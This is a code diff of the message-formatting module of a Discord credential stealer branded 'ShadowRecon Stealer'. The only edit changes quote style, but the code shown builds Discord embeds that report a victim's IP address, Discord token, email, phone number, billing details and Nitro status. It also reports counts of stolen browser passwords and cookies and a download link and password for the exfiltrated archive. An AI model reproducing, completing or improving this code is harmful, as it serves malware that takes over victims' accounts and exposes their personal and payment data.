@@ -14,7 +14,7 @@ class EmbedBuilder {
             color: null,
             fields: [],
             footer: {
-                text: "ShadowRecon Stealer"
+                text: 'ShadowRecon Stealer'
             },
             timestamp: new Date().toISOString(),
             ...options
@@ -38,47 +38,47 @@ class EmbedBuilder {
         
         const avatarUrl = account.avatar ? 
             `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp` : 
-            `https://cdn.discordapp.com/embed/avatars/0.png`;
+            'https://cdn.discordapp.com/embed/avatars/0.png';
         
         return this.createBase({
             fields: [
                 {
-                    name: ":earth_africa: IP",
+                    name: ':earth_africa: IP',
                     value: `\`${ip}\``,
                     inline: true
                 },
                 {
-                    name: ":mag_right: Username",
+                    name: ':mag_right: Username',
                     value: `\`${account.username}\``,
                     inline: true
                 },
                 {
-                    name: ":gem: Token",
+                    name: ':gem: Token',
                     value: `\`${account.token}\``,
                     inline: false
                 },
                 {
-                    name: ":e_mail: Email",
+                    name: ':e_mail: Email',
                     value: `\`${account.email || 'N/A'}\``,
                     inline: true
                 },
                 {
-                    name: ":mobile_phone: Phone",
+                    name: ':mobile_phone: Phone',
                     value: `\`${account.phone || 'N/A'}\``,
                     inline: true
                 },
                 {
-                    name: ":credit_card: Billing",
+                    name: ':credit_card: Billing',
                     value: `\`${billing}\``,
                     inline: true
                 },
                 {
-                    name: ":money_with_wings: Nitro",
+                    name: ':money_with_wings: Nitro',
                     value: `\`${account.nitro || 'None'}\``,
                     inline: true
                 },
                 {
-                    name: ":package: Badges",
+                    name: ':package: Badges',
                     value: `\`${badges}\``,
                     inline: true
                 }
@@ -104,7 +104,7 @@ class EmbedBuilder {
         const embed = this.createBase({
             fields: [
                 {
-                    name: ":earth_africa: IP",
+                    name: ':earth_africa: IP',
                     value: `\`${ip}\``,
                     inline: true
                 }
@@ -113,7 +113,7 @@ class EmbedBuilder {
 
         if (downloadUrl) {
             embed.fields.push({
-                name: ":file_folder: Download",
+                name: ':file_folder: Download',
                 value: `\`${downloadUrl}\``,
                 inline: false
             });
@@ -121,7 +121,7 @@ class EmbedBuilder {
 
         if (password) {
             embed.fields.push({
-                name: ":key: Password",
+                name: ':key: Password',
                 value: `\`${password}\``,
                 inline: true
             });
@@ -138,15 +138,15 @@ class EmbedBuilder {
      */
     static createSystemEmbed(systemInfo, stats) {
         return this.createBase({
-            title: "ShadowRecon | System Info",
+            title: 'ShadowRecon | System Info',
             fields: [
                 {
-                    name: ":computer: System",
+                    name: ':computer: System',
                     value: `**User:** ${systemInfo.username}\n**Host:** ${systemInfo.hostname}\n**IP:** ${systemInfo.ip}`,
                     inline: false
                 },
                 {
-                    name: ":bar_chart: Statistics",
+                    name: ':bar_chart: Statistics',
                     value: `**Passwords:** ${stats.browsers.passwords}\n**Cookies:** ${stats.browsers.cookies}`,
                     inline: false
                 }
